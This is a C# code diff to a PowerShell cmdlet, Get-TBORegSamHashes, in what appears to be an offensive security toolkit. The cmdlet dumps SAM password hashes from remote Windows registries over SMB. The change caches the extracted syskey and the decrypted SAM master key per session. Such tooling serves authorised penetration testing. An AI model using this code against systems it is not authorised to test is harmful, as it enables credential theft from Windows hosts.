@@ -46,6 +46,15 @@ namespace Titanis.Tbo.Smb2.PowerShell
 			{
 				ExecuteRegistryOperation(smb, cancellationToken, session =>
 				{
+					var cache = TryGetSecretCache(session);
+					if (cache != null && cache.TryGetBootKey(out var cachedKey))
+					{
+						syskey = cachedKey;
+						LogDiagnostic(smb, $"TBO: Registry secret cache hit (syskey) for {this.ServerName}.");
+						return;
+					}
+
+					LogDiagnostic(smb, $"TBO: Registry secret cache miss (syskey) for {this.ServerName}.");
 					LogDiagnostic(smb, $"Get-TBORegSamHashes: opening HKLM root on {this.ServerName}.");
 					var localMachineSpec = new RegistryPathSpec(
 						RegistryRootKey.LocalMachine,
@@ -59,6 +68,8 @@ namespace Titanis.Tbo.Smb2.PowerShell
 					LogDiagnostic(smb, $"Get-TBORegSamHashes: HKLM opened on {this.ServerName}.");
 					syskey = ExtractSyskey(smb, localMachineKey, cancellationToken);
 					LogDiagnostic(smb, $"Get-TBORegSamHashes: syskey extracted on {this.ServerName}.");
+					if (syskey != null && syskey.Length > 0)
+						cache?.SetBootKey(syskey);
 				});
 			}
 			catch (Exception ex)
@@ -112,13 +123,27 @@ namespace Titanis.Tbo.Smb2.PowerShell
 				RegistryAccessRights.EnumerateSubkeys | RegistryAccessRights.QueryValue,
 				cancellationToken);
 			LogDiagnostic(smb, $"Get-TBORegSamHashes: HKLM opened on {this.ServerName}.");
-			LogDiagnostic(smb, $"Get-TBORegSamHashes: opening SAM account key {SamAccountPath}.");
-			using var accountKey = localMachineKey.OpenSubkey(
-				SamAccountPath,
-				RegistryAccessRights.QueryValue | RegistryAccessRights.EnumerateSubkeys,
-				RegistryHelpers.BackupOptions,
-				cancellationToken).GetAwaiter().GetResult();
-			var store = ExtractSamStore(smb, accountKey, syskey, cancellationToken);
+			var cache = TryGetSecretCache(session);
+			SamStore? store = null;
+			byte[]? cachedMasterKey = null;
+			if (cache != null && cache.TryGetSamMasterKey(out cachedMasterKey))
+			{
+				LogDiagnostic(smb, $"TBO: Registry secret cache hit (SAM master key) for {this.ServerName}.");
+				store = new SamStore(cachedMasterKey);
+			}
+			else
+			{
+				LogDiagnostic(smb, $"TBO: Registry secret cache miss (SAM master key) for {this.ServerName}.");
+				LogDiagnostic(smb, $"Get-TBORegSamHashes: opening SAM account key {SamAccountPath}.");
+				using var accountKey = localMachineKey.OpenSubkey(
+					SamAccountPath,
+					RegistryAccessRights.QueryValue | RegistryAccessRights.EnumerateSubkeys,
+					RegistryHelpers.BackupOptions,
+					cancellationToken).GetAwaiter().GetResult();
+				store = ExtractSamStore(smb, accountKey, syskey, cancellationToken, out var masterKey);
+				if (store?.HasMasterKey == true && masterKey != null && masterKey.Length > 0)
+					cache?.SetSamMasterKey(masterKey);
+			}
 			LogDiagnostic(smb, $"Get-TBORegSamHashes: SAM store {(store?.HasMasterKey == true ? "has" : "missing")} master key on {this.ServerName}.");
 
 			List<TboRegSamHashInfo> userInfos = new();
@@ -266,8 +291,10 @@ namespace Titanis.Tbo.Smb2.PowerShell
 			ISmbProviderInfo smb,
 			IRegistryKey accountKey,
 			byte[] syskey,
-			CancellationToken cancellationToken)
+			CancellationToken cancellationToken,
+			out byte[]? masterKey)
 		{
+			masterKey = null;
 			var usersF = accountKey.GetValue("F", cancellationToken).GetAwaiter().GetResult();
 			var fBytes = RegistryHelpers.ExtractValueBytes(usersF);
 			LogDiagnostic(smb, $"Get-TBORegSamHashes: SAM account F value size {(fBytes?.Length ?? 0)} bytes.");
@@ -299,6 +326,7 @@ namespace Titanis.Tbo.Smb2.PowerShell
 				using var aes = Aes.Create();
 				aes.Key = syskey;
 				var decryptedMasterKey = aes.DecryptCbc(data, salt);
+				masterKey = decryptedMasterKey;
 				return new SamStore(decryptedMasterKey);
 			}
 			catch (Exception ex)
@@ -432,6 +460,14 @@ namespace Titanis.Tbo.Smb2.PowerShell
 				this.LogWarning(smb, $"Get-TBORegSamHashes failed to read class name for {name}: {ex.Message}");
 				return false;
 			}
+		}
+
+		private static RegistrySecretCache? TryGetSecretCache(IRegistrySession session)
+		{
+			if (session is IRegistrySecretCacheProvider provider)
+				return provider.SecretCache;
+
+			return null;
 		}
 
 		private static void LogDiagnostic(ISmbProviderInfo smb, string message)
